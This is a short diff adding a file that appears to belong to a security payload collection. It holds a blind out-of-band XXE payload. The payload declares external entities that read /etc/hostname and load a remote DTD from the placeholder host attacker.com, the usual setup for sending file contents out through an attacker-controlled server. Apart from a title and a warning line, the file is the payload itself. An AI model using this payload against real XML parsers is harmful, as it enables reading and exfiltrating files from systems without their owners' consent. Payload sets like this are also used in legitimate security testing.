@@ -1,0 +1,11 @@
+# Marfaak AI Security - XXE blind OOB
+
+**WARNING: This payload tests XXE blind OOB.**
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % dtd SYSTEM "https://attacker.com/xxe.dtd">
+  %dtd;
+]>
+<data>Blind XXE exfiltration via OOB channel</data>
